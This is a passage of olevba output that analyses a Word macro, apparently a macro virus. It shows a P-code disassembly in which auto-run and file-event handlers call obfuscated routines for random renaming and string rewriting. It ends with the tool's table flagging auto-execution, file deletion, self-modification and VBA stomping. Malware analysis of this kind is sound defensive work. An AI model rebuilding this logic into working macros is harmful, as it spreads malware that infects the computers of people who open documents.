' Line #110:
' Line #111:
' 	EndSub 
' Line #112:
' 	FuncDefn (Sub FileSave())
' Line #113:
' 	OnError (Resume Next) 
' Line #114:
' 	ArgsCall (Call) MUJBRSYCRXIJWVXB 0x0000 
' Line #115:
' 	EndSub 
' Line #116:
' 	FuncDefn (Sub FileClose())
' Line #117:
' 	OnError (Resume Next) 
' Line #118:
' 	ArgsCall (Call) MUJBRSYCRXIJWVXB 0x0000 
' Line #119:
' 	EndSub 
' Line #120:
' 	FuncDefn (Sub FileOpen())
' Line #121:
' 	OnError (Resume Next) 
' Line #122:
' Line #123:
' 	ArgsCall (Call) MUJBRSYCRXIJWVXB 0x0000 
' Line #124:
' 	EndSub 
' Line #125:
' 	FuncDefn (Sub AutoOpen())
' Line #126:
' 	OnError (Resume Next) 
' Line #127:
' Line #128:
' 	ArgsCall (Call) MUJBRSYCRXIJWVXB 0x0000 
' Line #129:
' 	EndSub 
' Line #130:
' 	FuncDefn (Sub AutoClose())
' Line #131:
' 	OnError (Resume Next) 
' Line #132:
' Line #133:
' 	ArgsCall (Call) MUJBRSYCRXIJWVXB 0x0000 
' Line #134:
' 	EndSub 
' Line #135:
' 	FuncDefn (Sub autonew())
' Line #136:
' 	OnError (Resume Next) 
' Line #137:
' Line #138:
' 	ArgsCall (Call) MUJBRSYCRXIJWVXB 0x0000 
' Line #139:
' 	EndSub 
' Line #140:
' 	FuncDefn (Sub AutoExec())
' Line #141:
' 	OnError (Resume Next) 
' Line #142:
' Line #143:
' 	ArgsCall (Call) MUJBRSYCRXIJWVXB 0x0000 
' Line #144:
' 	EndSub 
' Line #145:
' 	FuncDefn (Function FFJGFGKVFBENTJ(SITZMNTXXNOPGF As Byte) As String)
' Line #146:
' 	Dim 
' 	VarDefn MCYKFQLHTEAE (As String)
' 	VarDefn TJDSTELPQDXBS (As String)
' Line #147:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #148:
' 	StartForVariable 
' 	Ld GJIHHZCUNN 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	Ld SITZMNTXXNOPGF 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0008 
' 	Add 
' 	For 
' Line #149:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	LitDI2 0x0041 
' 	Add 
' 	FnInt 
' 	ArgsLd Chr 0x0001 
' 	St MCYKFQLHTEAE 
' Line #150:
' 	Ld MCYKFQLHTEAE 
' 	Ld TJDSTELPQDXBS 
' 	Add 
' 	St TJDSTELPQDXBS 
' Line #151:
' 	StartForVariable 
' 	Ld GJIHHZCUNN 
' 	EndForVariable 
' 	NextVar 
' Line #152:
' 	Ld TJDSTELPQDXBS 
' 	St FFJGFGKVFBENTJ 
' Line #153:
' 	EndFunc 
' Line #154:
' 	FuncDefn (Function CADEVKFVUU(DCNFRKUH As String) As String)
' Line #155:
' 	Dim 
' 	VarDefn PQTHXOIJFIK (As Long)
' 	VarDefn MCYKFQLHTEAE (As String)
' Line #156:
' 	Ld DCNFRKUH 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #157:
' 	Ld DCNFRKUH 
' 	ArgsLd UCase 0x0001 
' 	St MCYKFQLHTEAE 
' Line #158:
' 	StartForVariable 
' 	Ld GJIHHZCUNN 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MCYKFQLHTEAE 
' 	FnLen 
' 	For 
' Line #159:
' 	Ld PQTHXOIJFIK 
' 	Ld MCYKFQLHTEAE 
' 	Ld GJIHHZCUNN 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	ArgsLd Asc 0x0001 
' 	Add 
' 	St PQTHXOIJFIK 
' Line #160:
' 	StartForVariable 
' 	Ld GJIHHZCUNN 
' 	EndForVariable 
' 	NextVar 
' Line #161:
' 	Ld DCNFRKUH 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	Ld PQTHXOIJFIK 
' 	ArgsLd Str 0x0001 
' 	ArgsLd LTrim 0x0001 
' 	FnLen 
' 	ArgsLd Str 0x0001 
' 	ArgsLd LTrim 0x0001 
' 	Add 
' 	Ld PQTHXOIJFIK 
' 	ArgsLd Str 0x0001 
' 	ArgsLd LTrim 0x0001 
' 	Add 
' 	Ld DCNFRKUH 
' 	Ld DCNFRKUH 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Add 
' 	St CADEVKFVUU 
' Line #162:
' 	ElseBlock 
' Line #163:
' 	LitStr 0x0001 "1"
' 	St CADEVKFVUU 
' Line #164:
' 	EndIfBlock 
' Line #165:
' Line #166:
' 	EndFunc 
' Line #167:
' Line #168:
' 	FuncDefn (Function XNFAXYUIAJGQTUTOV(DCNFRKUH As String) As Boolean)
' Line #169:
' 	Dim 
' 	VarDefn PQTHXOIJFIK (As Long)
' 	VarDefn MCYKFQLHTEAE (As String)
' Line #170:
' 	OnError (Resume Next) 
' Line #171:
' 	Ld DCNFRKUH 
' 	FnLen 
' 	LitDI2 0x000A 
' 	Gt 
' 	IfBlock 
' Line #172:
' 	LineCont 0x0008 09 00 02 00 12 00 02 00
' 	Ld DCNFRKUH 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	Ld DCNFRKUH 
' 	Ld DCNFRKUH 
' 	FnLen 
' 	LitDI2 0x0002 
' 	Ld DCNFRKUH 
' 	LitDI2 0x0003 
' 	Ld DCNFRKUH 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Coerce (Int) 
' 	ArgsLd Mid$ 0x0003 
' 	FnLen 
' 	Add 
' 	Paren 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Add 
' 	St MCYKFQLHTEAE 
' Line #173:
' 	Ld DCNFRKUH 
' 	Ld MCYKFQLHTEAE 
' 	ArgsLd CADEVKFVUU 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St XNFAXYUIAJGQTUTOV 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St XNFAXYUIAJGQTUTOV 
' 	EndIf 
' Line #174:
' 	ElseBlock 
' Line #175:
' 	LitVarSpecial (False)
' 	St XNFAXYUIAJGQTUTOV 
' Line #176:
' 	EndIfBlock 
' Line #177:
' 	EndFunc 
' Line #178:
' 	FuncDefn (Function VFPEBFTAR1(MCYKFQLHTEAE As String) As String)
' Line #179:
' 	Dim 
' 	VarDefn PQTHXOIJFIK (As Byte)
' 	VarDefn MCYKFQLHTEAE3 (As String)
' Line #180:
' 	Ld MCYKFQLHTEAE 
' 	St MCYKFQLHTEAE3 
' Line #181:
' 	LitDI2 0x0001 
' 	St PQTHXOIJFIK 
' Line #182:
' 	Ld PQTHXOIJFIK 
' 	ArgsLd QODKQJAGBKSA 0x0001 
' 	ArgsLd RTrim 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld PQTHXOIJFIK 
' 	LitDI2 0x0050 
' 	Lt 
' 	And 
' 	Paren 
' 	DoWhile 
' Line #183:
' 	Ld PQTHXOIJFIK 
' 	LitDI2 0x0051 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld PQTHXOIJFIK 
' 	LitDI2 0x0001 
' 	Add 
' 	St PQTHXOIJFIK 
' 	Else 
' 	BoSImplicit 
' 	ExitDo 
' 	EndIf 
' Line #184:
' 	Loop 
' Line #185:
' 	StartForVariable 
' 	Ld GJIHHZCUNN 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld PQTHXOIJFIK 
' 	For 
' Line #186:
' 	LitDI2 0x0001 
' 	Ld MCYKFQLHTEAE3 
' 	Ld GJIHHZCUNN 
' 	ArgsLd QODKQJAGBKSA 0x0001 
' 	FnInStr3 
' 	St PQTHXOIJFIK1 
' Line #187:
' 	Ld PQTHXOIJFIK1 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld GJIHHZCUNN 
' 	ArgsLd QODKQJAGBKSA 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	Paren 
' 	DoWhile 
' Line #188:
' 	Ld MCYKFQLHTEAE3 
' 	Ld PQTHXOIJFIK1 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	St MCYKFQLHTEAE1 
' Line #189:
' 	Ld MCYKFQLHTEAE3 
' 	Ld MCYKFQLHTEAE3 
' 	FnLen 
' 	Ld MCYKFQLHTEAE1 
' 	FnLen 
' 	Sub 
' 	Ld GJIHHZCUNN 
' 	ArgsLd QODKQJAGBKSA 0x0001 
' 	FnLen 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	St MCYKFQLHTEAE2 
' Line #190:
' 	Ld MCYKFQLHTEAE1 
' 	Ld GJIHHZCUNN 
' 	ArgsLd QODKQJAGBKSA1 0x0001 
' 	Add 
' 	Ld MCYKFQLHTEAE2 
' 	Add 
' 	St MCYKFQLHTEAE3 
' Line #191:
' 	LitDI2 0x0001 
' 	Ld MCYKFQLHTEAE3 
' 	Ld GJIHHZCUNN 
' 	ArgsLd QODKQJAGBKSA 0x0001 
' 	FnInStr3 
' 	St PQTHXOIJFIK1 
' Line #192:
' 	Loop 
' Line #193:
' 	StartForVariable 
' 	Ld GJIHHZCUNN 
' 	EndForVariable 
' 	NextVar 
' Line #194:
' 	Ld MCYKFQLHTEAE3 
' 	St VFPEBFTAR1 
' Line #195:
' 	EndFunc 
' Line #196:
' 	FuncDefn (Sub VFPEBFTAR2())
' Line #197:
' 	LitDI2 0x0001 
' 	St PQTHXOIJFIK 
' Line #198:
' 	Ld PQTHXOIJFIK 
' 	ArgsLd QODKQJAGBKSA 0x0001 
' 	ArgsLd RTrim 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld PQTHXOIJFIK 
' 	LitDI2 0x0050 
' 	Lt 
' 	And 
' 	Paren 
' 	DoWhile 
' Line #199:
' 	Ld PQTHXOIJFIK 
' 	LitDI2 0x0051 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld PQTHXOIJFIK 
' 	LitDI2 0x0001 
' 	Add 
' 	St PQTHXOIJFIK 
' 	Else 
' 	BoSImplicit 
' 	ExitDo 
' 	EndIf 
' Line #200:
' 	Loop 
' Line #201:
' 	LitDI2 0x0014 
' 	ArgsLd FFJGFGKVFBENTJ 0x0001 
' 	ArgsLd CADEVKFVUU 0x0001 
' 	LitDI2 0x0001 
' 	ArgsSt QODKQJAGBKSA1 0x0001 
' Line #202:
' 	StartForVariable 
' 	Ld GJIHHZCUNN 
' 	EndForVariable 
' 	LitDI2 0x0002 
' 	Ld PQTHXOIJFIK 
' 	For 
' Line #203:
' 	LitDI2 0x000A 
' 	ArgsLd FFJGFGKVFBENTJ 0x0001 
' 	Ld GJIHHZCUNN 
' 	ArgsSt QODKQJAGBKSA1 0x0001 
' Line #204:
' 	StartForVariable 
' 	Ld GJIHHZCUNN 
' 	EndForVariable 
' 	NextVar 
' Line #205:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |autonew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

